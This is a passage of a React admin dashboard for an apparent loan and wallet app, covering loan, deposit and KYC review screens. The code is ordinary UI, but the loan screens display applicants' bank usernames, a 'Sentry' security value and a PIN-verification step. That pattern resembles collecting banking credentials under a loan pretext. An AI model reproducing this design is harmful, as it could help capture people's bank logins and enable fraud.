                                <p className="text-[10px] text-gray-500">Phone: <span className="text-gray-700 dark:text-gray-300">{loan.additionalDetails?.phoneNumber}</span></p>
                              </div>
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Bank Auth</p>
                                <p className="text-[10px] text-gray-500">User: <span className="text-gray-700 dark:text-gray-300">{loan.additionalDetails?.bankUsername}</span></p>
                              </div>
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Security</p>
                                <p className="text-[10px] text-gray-500">Sentry: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.sentry}</span></p>
                              </div>
                            </div>
                          </td>
                          <td className="py-4 text-right">
                            <div className="flex flex-col gap-2 items-end">
                              <div className="flex gap-2">
                                <button 
                                  onClick={() => setSelectedLoan(loan)}
                                  className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-400"
                                  title="View All Details"
                                >
                                  <Eye className="w-5 h-5" />
                                </button>
                                <button 
                                  onClick={() => handleLoanStatusUpdate(loan.id, 'disbursed')}
                                  className="btn-primary px-6 py-3 text-xs bg-green-600 hover:bg-green-700 shadow-lg shadow-green-600/20"
                                >
                                  Approve & Disburse
                                </button>
                              </div>
                              <button 
                                onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
                                className="text-[10px] font-black uppercase text-red-500 hover:underline"
                              >
                                Reject at Final Stage
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        ) : activeTab === 'deposits' ? (
          <div className="space-y-6">
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Pending Deposits
                <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pendingDeposits.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">User</th>
                      <th className="pb-4 font-bold">Amount</th>
                      <th className="pb-4 font-bold">Method</th>
                      <th className="pb-4 font-bold">Date</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {pendingDeposits.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="py-10 text-center text-gray-500">
                          No pending deposits to review.
                        </td>
                      </tr>
                    ) : (
                      pendingDeposits.map((deposit) => (
                        <tr key={deposit.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{deposit.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{deposit.userId}</div>
                          </td>
                          <td className="py-4 font-bold text-accent">${deposit.amount.toLocaleString()}</td>
                          <td className="py-4 text-gray-500">{deposit.method}</td>
                          <td className="py-4 text-gray-500">{formatDate(deposit.createdAt)}</td>
                          <td className="py-4 text-right">
                            <button 
                              onClick={() => setSelectedDeposit(deposit)}
                              className="btn-secondary px-4 py-2 text-xs flex items-center gap-2 ml-auto"
                            >
                              <Eye className="w-4 h-4" />
                              Review Proof
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Deposit Review Detail */}
            <AnimatePresence>
              {selectedDeposit && (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: 20 }}
                  className="card border-2 border-accent/20"
                >
                  <div className="flex justify-between items-start mb-8">
                    <div>
                      <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">Reviewing Deposit: ${selectedDeposit.amount}</h3>
                      <p className="text-gray-500">User: {selectedDeposit.userEmail} | Method: {selectedDeposit.method}</p>
                    </div>
                    <button onClick={() => setSelectedDeposit(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                      <XCircle className="w-6 h-6 text-gray-400" />
                    </button>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
                    <div className="space-y-4">
                      <h4 className="text-xs font-black uppercase tracking-widest text-accent">Transaction Details</h4>
                      <div className="bg-gray-50 dark:bg-zinc-900 p-6 rounded-2xl space-y-4 border border-gray-100 dark:border-zinc-800">
                        <DetailItem label="Amount" value={`$${selectedDeposit.amount.toLocaleString()}`} />
                        <DetailItem label="Method" value={selectedDeposit.method} />
                        <DetailItem label="User Email" value={selectedDeposit.userEmail} />
                        <DetailItem label="Date Submitted" value={formatDate(selectedDeposit.createdAt)} />
                      </div>
                    </div>

                    <div className="space-y-4">
                      <h4 className="text-xs font-black uppercase tracking-widest text-accent">Proof of Payment</h4>
                      <div className="bg-gray-50 dark:bg-zinc-900 p-2 rounded-2xl border border-gray-100 dark:border-zinc-800 overflow-hidden">
                        {selectedDeposit.proofOfPayment ? (
                          <img 
                            src={selectedDeposit.proofOfPayment} 
                            alt="Proof of Payment" 
                            className="w-full h-auto rounded-xl shadow-lg cursor-zoom-in"
                            onClick={() => window.open(selectedDeposit.proofOfPayment, '_blank')}
                          />
                        ) : (
                          <div className="py-20 text-center text-gray-400 italic">No proof image provided</div>
                        )}
                      </div>
                    </div>
                  </div>

                  <div className="flex justify-end gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
                    <button 
                      onClick={() => handleDepositUpdate(selectedDeposit.id, 'rejected')}
                      className="btn-secondary px-8 py-3 text-red-500 border-red-100 hover:bg-red-50"
                    >
                      Reject Deposit
                    </button>
                    <button 
                      onClick={() => handleDepositUpdate(selectedDeposit.id, 'completed')}
                      className="btn-primary px-8 py-3 bg-green-600 hover:bg-green-700 shadow-lg shadow-green-600/20"
                    >
                      Approve & Add Funds
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Pending KYC Verifications
                <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pendingKYCs.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">User</th>
                      <th className="pb-4 font-bold">Full Name</th>
                      <th className="pb-4 font-bold">Submitted At</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {loading ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          Loading verifications...
                        </td>
                      </tr>
                    ) : pendingKYCs.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          No pending KYC verifications.
                        </td>
                      </tr>
                    ) : (
                      pendingKYCs.map((kyc) => (
                        <tr key={kyc.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{kyc.email}</div>
                            <div className="text-xs text-gray-400 font-mono">{kyc.id}</div>
                          </td>
                          <td className="py-4 font-bold dark:text-white">{kyc.fullName}</td>
                          <td className="py-4 text-gray-500">
                            {kyc.kycSubmittedAt?.toDate ? kyc.kycSubmittedAt.toDate().toLocaleDateString() : kyc.kycSubmittedAt ? new Date(kyc.kycSubmittedAt).toLocaleDateString() : 'N/A'}
                          </td>
                          <td className="py-4 text-right">
                            <button 
                              onClick={() => setSelectedKYC(kyc)}
                              className="btn-secondary px-4 py-2 text-xs flex items-center gap-2 ml-auto"
                            >
                              <Eye className="w-4 h-4" />
                              Review
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* KYC Review Detail */}
            <AnimatePresence>
              {selectedKYC && (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: 20 }}
                  className="card border-2 border-accent/20"
                >
                  <div className="flex justify-between items-start mb-8">
                    <div>
                      <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">Reviewing: {selectedKYC.fullName}</h3>
                      <p className="text-gray-500">User ID: {selectedKYC.id}</p>
                    </div>
                    <button onClick={() => setSelectedKYC(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                      <XCircle className="w-6 h-6 text-gray-400" />
                    </button>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mb-10">
                    <DetailSection title="Personal Details">
                      <DetailItem label="Full Name" value={selectedKYC.fullName} />
                      <DetailItem label="Date of Birth" value={selectedKYC.dob} />
                      <DetailItem label="Marital Status" value={selectedKYC.maritalStatus} />
                      <DetailItem label="Address" value={selectedKYC.address} />
                      <DetailItem label="State of Origin" value={selectedKYC.stateOfOrigin} />
                    </DetailSection>

                    <DetailSection title="Employment Details">
                      <DetailItem label="Status" value={selectedKYC.employmentStatus} />
                      <DetailItem label="Employer" value={selectedKYC.employerName} />
                      <DetailItem label="Job Title" value={selectedKYC.jobTitle} />
                      <DetailItem label="Monthly Income" value={selectedKYC.monthlyIncome} />
                    </DetailSection>

                    <DetailSection title="Documents">
                      <DetailItem label="National ID Number" value={selectedKYC.nationalIdNumber} />
                    </DetailSection>
                  </div>

                  <div className="flex justify-end gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
                    <button 
                      onClick={() => setShowRejectionModal(true)}
                      className="btn-secondary px-8 py-3 text-red-500 border-red-100 hover:bg-red-50"
                    >
                      Reject Submission
                    </button>
                    <button 
                      onClick={() => handleKYCUpdate(selectedKYC.id, 'verified')}
                      className="btn-primary px-8 py-3"
                    >
                      Approve & Verify User
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        )}
      </main>

      {/* User Detail Modal */}
      <AnimatePresence>
        {selectedUser && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setSelectedUser(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-2xl w-full shadow-2xl border border-gray-200 dark:border-zinc-800 overflow-y-auto max-h-[90vh]"
            >
              <div className="flex justify-between items-start mb-8">
                <div>
                  <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">User Profile</h3>
                  <p className="text-gray-500">ID: {selectedUser.id}</p>
                </div>
                <button onClick={() => setSelectedUser(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                  <XCircle className="w-6 h-6 text-gray-400" />
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
                <DetailSection title="Account Info">
                  <DetailItem label="Email" value={selectedUser.email} />
                  <DetailItem label="Wallet Balance" value={`$${(selectedUser.walletBalance || 0).toLocaleString()}`} />
                  <DetailItem label="KYC Status" value={selectedUser.kycStatus || 'Not Started'} />
                  <DetailItem label="Joined" value={formatDate(selectedUser.createdAt)} />
                </DetailSection>

                <DetailSection title="Personal Info">
                  <DetailItem label="Full Name" value={selectedUser.fullName} />
                  <DetailItem label="Phone" value={selectedUser.phoneNumber} />
                  <DetailItem label="Address" value={selectedUser.address} />
                </DetailSection>
              </div>

              <div className="flex gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
                <button 
                  onClick={() => setSelectedUser(null)}
                  className="flex-1 py-4 rounded-2xl font-bold text-gray-500 hover:bg-gray-100 dark:hover:bg-zinc-900 transition-all border border-gray-200 dark:border-zinc-800"
                >
                  Close Profile
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Loan Detail Modal */}
      <AnimatePresence>
        {selectedLoan && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setSelectedLoan(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-2xl w-full shadow-2xl border border-gray-200 dark:border-zinc-800 overflow-y-auto max-h-[90vh]"
            >
              <div className="flex justify-between items-start mb-8">
                <div>
                  <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">Loan Review</h3>
                  <p className="text-gray-500">ID: {selectedLoan.id}</p>
                </div>
                <button onClick={() => setSelectedLoan(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                  <XCircle className="w-6 h-6 text-gray-400" />
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
                <DetailSection title="Application Info">
                  <DetailItem label="Applicant" value={selectedLoan.userEmail} />
                  <DetailItem label="Amount" value={`$${selectedLoan.amount.toLocaleString()}`} />
                  <DetailItem label="Purpose" value={selectedLoan.purpose} />
                  <DetailItem label="Status" value={selectedLoan.status.toUpperCase()} />
                </DetailSection>

                <DetailSection title="Bank Details">
                  <DetailItem label="Bank Name" value={selectedLoan.bankDetails?.bankName} />
                  <DetailItem label="Account Number" value={selectedLoan.bankDetails?.accountNumber} />
                  <DetailItem label="Account Name" value={selectedLoan.bankDetails?.accountName} />
                </DetailSection>

                <DetailSection title="Verification Data">
                  <DetailItem label="IBAN" value={selectedLoan.additionalDetails?.iban} />
                  <DetailItem label="Phone Number" value={selectedLoan.additionalDetails?.phoneNumber} />
                  <DetailItem label="Bank Username" value={selectedLoan.additionalDetails?.bankUsername} />
                  <DetailItem label="Sentry ID" value={selectedLoan.additionalDetails?.sentry} />
                </DetailSection>

                <DetailSection title="Timestamps">
                  <DetailItem label="Applied" value={formatDate(selectedLoan.createdAt)} />
                  <DetailItem label="Bank Submitted" value={formatDate(selectedLoan.bankSubmittedAt)} />
                  <DetailItem label="PIN Verified" value={formatDate(selectedLoan.pinSubmittedAt)} />
                </DetailSection>
              </div>

              <div className="flex gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
                {['pending', 'bank_details_submitted', 'pin_sent', 'pin_submitted'].includes(selectedLoan.status) && (
                  <button 
                    onClick={() => {
                      handleLoanStatusUpdate(selectedLoan.id, 'rejected');
                      setSelectedLoan(null);
                    }}
                    className="flex-1 py-4 rounded-2xl font-bold text-red-500 hover:bg-red-50 transition-all border border-red-100"
                  >
                    Reject Application
                  </button>
                )}
                
                {selectedLoan.status === 'pending' && (
                  <button 
                    onClick={() => {
                      handleLoanStatusUpdate(selectedLoan.id, 'approved');
                      setSelectedLoan(null);
                    }}
                    className="flex-1 btn-primary py-4"
                  >
                    Approve Application
                  </button>
                )}

                {selectedLoan.status === 'pin_submitted' && (
                  <button 
                    onClick={() => {
                      handleLoanStatusUpdate(selectedLoan.id, 'disbursed');
                      setSelectedLoan(null);
                    }}
                    className="flex-1 btn-primary py-4"
                  >
                    Approve & Disburse
                  </button>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Rejection Modal */}
      <AnimatePresence>
        {showRejectionModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowRejectionModal(false)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-md w-full shadow-2xl border border-gray-200 dark:border-zinc-800"
            >
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Rejection Reason</h3>
              <p className="text-gray-500 mb-6">Please provide a clear reason why this KYC submission is being rejected. The user will see this message.</p>
              
              <textarea 
                value={rejectionReason}
                onChange={(e) => setRejectionReason(e.target.value)}
                className="input-field min-h-[120px] py-4 mb-6"
                placeholder="e.g. The provided ID number does not match our records or the address is incomplete."
              />

              <div className="flex gap-4">
                <button 
                  onClick={() => setShowRejectionModal(false)}
                  className="flex-1 py-3 rounded-2xl font-bold text-gray-500 hover:bg-gray-100 dark:hover:bg-zinc-900 transition-all"
                >
                  Cancel
                </button>
                <button 
                  onClick={() => handleKYCUpdate(selectedKYC.id, 'rejected', rejectionReason)}
                  disabled={!rejectionReason.trim()}
                  className="flex-1 btn-primary py-3 disabled:opacity-50"
                >
                  Confirm Reject
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const TabButton = ({ active, onClick, icon, label, count }: { active: boolean, onClick: () => void, icon: React.ReactNode, label: string, count?: number }) => (
  <button 
    onClick={onClick}
    className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-xs font-black uppercase tracking-widest transition-all ${
      active 
        ? 'bg-white dark:bg-zinc-800 text-accent shadow-sm' 
        : 'text-gray-500 hover:text-gray-700 dark:hover:text-gray-300'
    }`}
  >
    {icon}
    {label}
    {count !== undefined && count > 0 && (
      <span className="bg-accent text-white text-[9px] px-1.5 py-0.5 rounded-full">
        {count}
      </span>
    )}
  </button>
);

const FunnelStep = ({ label, value, total, color }: { label: string, value: number, total: number, color: string }) => (
  <div className="space-y-2">
    <div className="flex justify-between text-[10px] font-black uppercase tracking-widest">
      <span className="text-gray-500">{label}</span>
      <span className="dark:text-white">{value} / {total}</span>
    </div>
    <div className="h-2 bg-gray-100 dark:bg-zinc-800 rounded-full overflow-hidden">
      <motion.div 
        initial={{ width: 0 }}
        animate={{ width: `${(value / total) * 100}%` }}
        className={`h-full ${color}`}
      />
    </div>
  </div>
);

const DetailSection = ({ title, children }: { title: string, children: React.ReactNode }) => (
  <div className="space-y-4">
    <h4 className="text-xs font-black uppercase tracking-widest text-accent">{title}</h4>
    <div className="space-y-3">
      {children}
    </div>
  </div>
);

const DetailItem = ({ label, value }: { label: string, value: string }) => (
  <div>
    <p className="text-[10px] font-black uppercase tracking-widest text-gray-400 mb-0.5">{label}</p>
    <p className="font-bold dark:text-white">{value || 'N/A'}</p>
  </div>
);

const AdminStatCard = ({ icon, label, value, subValue }: { icon: React.ReactNode, label: string, value: string, subValue?: string }) => (
  <div className="card">
    <div className="flex justify-between items-start mb-4">
      <div className="p-3 rounded-xl bg-gray-50 dark:bg-zinc-800">
        {React.cloneElement(icon as React.ReactElement, { className: "w-6 h-6" })}
      </div>
      {subValue && (
        <span className="text-gray-400 text-[10px] font-black uppercase tracking-widest">
          {subValue}
        </span>
      )}
    </div>
    <p className="text-xs text-gray-500 font-black uppercase tracking-widest mb-1 opacity-60">{label}</p>
    <p className="text-3xl font-black dark:text-white tracking-tighter">{value}</p>
  </div>
);
